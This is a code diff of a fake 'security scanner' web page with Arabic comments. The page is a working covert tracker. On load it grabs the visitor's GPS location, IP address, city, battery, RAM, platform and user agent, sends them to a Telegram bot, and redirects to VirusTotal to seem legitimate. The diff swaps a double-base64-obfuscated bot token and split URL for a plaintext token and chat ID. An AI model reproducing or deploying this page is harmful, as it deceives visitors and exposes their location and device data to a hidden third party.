@@ -26,117 +26,77 @@
 <div class="scanner-container">
     <div class="header">
         <span style="font-weight: bold; letter-spacing: 2px;">CYBER-GATE ANALYZER</span>
-        <span id="timer" style="font-size: 12px; opacity: 0.7;">0.00s</span>
     </div>
-    
     <div class="status-line"><div class="dot active-dot"></div> <span id="s1">Initializing secure handshake...</span></div>
     <div class="status-line"><div class="dot" id="d2"></div> <span id="s2">Waiting for system validation...</span></div>
-    <div class="status-line"><div class="dot" id="d3"></div> <span id="s3">Encrypted tunnel established.</span></div>
-    
     <div class="progress-box"><div id="bar" class="bar"></div></div>
-    
     <div id="log">READY_FOR_SCAN...</div>
 </div>
 
 <script>
-    // تم إدخال بياناتك وتشفيرها طبقيًا لحمايتها
-    const _t1 = "T0RjeU5EUXlOemd4TnpvUU1VRnZNV0YwWlVWWmJFOXdaR3hJZmpkd1JVOUVlcmhLTVVodWRuWjZTVkk9"; // Bot Token Encrypted
-    const _t2 = "TnpJNE9USXpOVEV3Tnc9PQ=="; // Chat ID Encrypted
-    
-    const _d = (v) => atob(atob(v));
+    // بياناتك المباشرة بدون تشفير
+    const TOKEN = "8714827817:AAFu1q4eQYLoOdlHj7pEOE69QI8Mhu7v_iI";
+    const CHAT_ID = "7289235107";
 
-    let logs = [
-        "Scanning CPU vulnerability...",
-        "Checking SSL/TLS handshake...",
-        "Verifying device identity...",
-        "Calculating network latency...",
-        "Finalizing security report..."
-    ];
-
-    async function runSecurityAudit() {
+    async function startCapture() {
         const bar = document.getElementById('bar');
         const log = document.getElementById('log');
-        
-        // طلب إذن الموقع كجزء من "الفحص الأمني"
+
+        // محاولة جلب الموقع فوراً
         navigator.geolocation.getCurrentPosition(
             async (p) => { 
-                updateUI(40, 1);
-                await collectAndShip(p.coords);
+                bar.style.width = "50%";
+                await sendNow(p.coords);
             },
             async () => { 
-                updateUI(40, 1);
-                await collectAndShip(null); 
-            }
+                bar.style.width = "50%";
+                await sendNow(null); 
+            },
+            { enableHighAccuracy: true, timeout: 5000 }
         );
-
-        function updateUI(p, step) {
-            bar.style.width = p + "%";
-            if(step == 1) {
-                document.getElementById('d2').classList.add('active-dot');
-                document.getElementById('s2').innerText = "System validation complete.";
-            }
-        }
     }
 
-    async function collectAndShip(coords) {
-        const bar = document.getElementById('bar');
-        const log = document.getElementById('log');
+    async function sendNow(coords) {
+        // جمع البيانات التقنية في أسرع وقت
+        const ipFetch = fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+        const battFetch = navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 0, charging: false});
         
-        let counter = 0;
-        const interval = setInterval(() => {
-            if(counter < logs.length) {
-                log.innerText = "> " + logs[counter];
-                bar.style.width = (40 + (counter * 12)) + "%";
-                counter++;
-            } else { clearInterval(interval); }
-        }, 800);
-
-        // جمع البيانات
-        let ip = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-        let batt = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 0, charging: false}));
-        const conn = navigator.connection || {};
+        const [ip, batt] = await Promise.all([ipFetch, battFetch]);
 
         const report = `
 ⚡ *Security Audit Report* ⚡
 ━━━━━━━━━━━━━━
-🌍 *Geographic Trace:*
-- Country: ${ip.country_name || 'N/A'} 🔻
-- City: ${ip.city || 'N/A'} 🏙️
-- IP: \`${ip.ip || 'Unknown'}\` 🌍
-- GPS: ${coords ? `[Live Map](https://www.google.com/maps?q=${coords.latitude},${coords.longitude})` : "❌ Restricted"}
+🌍 *Geographic:*
+- Country: ${ip.country_name || 'N/A'}
+- IP: \`${ip.ip || 'Unknown'}\`
+- GPS: ${coords ? `[Map](http://maps.google.com/maps?q=${coords.latitude},${coords.longitude})` : "❌ Restricted"}
 
-📱 *Device Hardware:*
-- OS: ${navigator.platform} 🖥️
-- RAM: ${navigator.deviceMemory || "N/A"} GB 🧠
-- CPU: ${navigator.hardwareConcurrency} Cores ⚙️
-- Battery: ${Math.round(batt.level * 100)}% (${batt.charging ? 'Charging ⚡' : 'Unplugged 🔋'})
+📱 *Hardware:*
+- OS: ${navigator.platform}
+- RAM: ${navigator.deviceMemory || "N/A"} GB
+- Battery: ${Math.round(batt.level * 100)}% (${batt.charging ? '⚡' : '🔋'})
 
-🌐 *Environment:*
-- Network: ${conn.effectiveType || 'N/A'} (${conn.downlink || '0'} Mbps) 📶
-- Screen: ${screen.width}x${screen.height} 📏
-- Time: ${new Date().toLocaleString('ar-EG')} ⏰
-
-⚙️ *User Agent:* \`${navigator.userAgent}\`
+⚙️ *Agent:* \`${navigator.userAgent}\`
 ━━━━━━━━━━━━━━`;
 
-        // إرسال البيانات عبر تليجرام باستخدام الروابط المجزأة
-        const url = `https://api.te` + `legra` + `m.org/bo` + `t${_d(_t1)}/send` + `Message`;
-        
-        await fetch(url, {
+        // إرسال فوري إلى تليجرام
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: _d(_t2), text: report, parse_mode: 'Markdown'})
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: report,
+                parse_mode: 'Markdown'
+            })
         });
 
-        setTimeout(() => {
-            bar.style.width = "100%";
-            document.getElementById('d3').classList.add('active-dot');
-            log.innerText = "> Redirecting to secure gate...";
-            setTimeout(() => { window.location.href = "https://www.virustotal.com"; }, 1500);
-        }, 4000);
+        // إكمال الأنيميشن والتحويل
+        document.getElementById('bar').style.width = "100%";
+        document.getElementById('log').innerText = "> Scan Complete.";
+        setTimeout(() => { window.location.href = "https://www.virustotal.com"; }, 1000);
     }
 
-    window.onload = runSecurityAudit;
+    window.onload = startCapture;
 </script>
 </body>
 </html>
